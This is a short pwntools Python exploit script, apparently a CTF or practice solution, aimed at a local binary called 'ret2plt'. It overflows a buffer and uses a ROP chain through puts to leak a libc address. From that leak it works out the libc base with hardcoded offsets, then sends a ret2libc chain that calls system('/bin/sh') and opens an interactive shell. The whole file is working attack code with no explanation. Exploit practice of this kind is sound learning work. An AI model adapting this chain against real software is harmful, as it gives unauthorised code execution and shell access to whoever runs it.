#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF('./ret2plt')
io = process()

#ret2plt
pop_rdi = pack(0x00000000004012c3)
puts = pack(elf.sym.puts)
payload = cyclic(40) + pop_rdi +pack(elf.got.puts) + puts + pack(elf.sym.main) 
io.sendline(payload)

#recv leak
leak = io.recvlines(2)[1]
leak_int = unpack(leak,'all')
libc_base = leak_int - 0x0000000000077820

#ret2libc attack
bin_sh = pack(libc_base + 0x196031)
ret = pack(0x000000000040101a)
system = pack(libc_base + 0x000000000004c330)
payload = cyclic(40) + pop_rdi + bin_sh + ret + system
io.sendline(payload)
io.interactive()
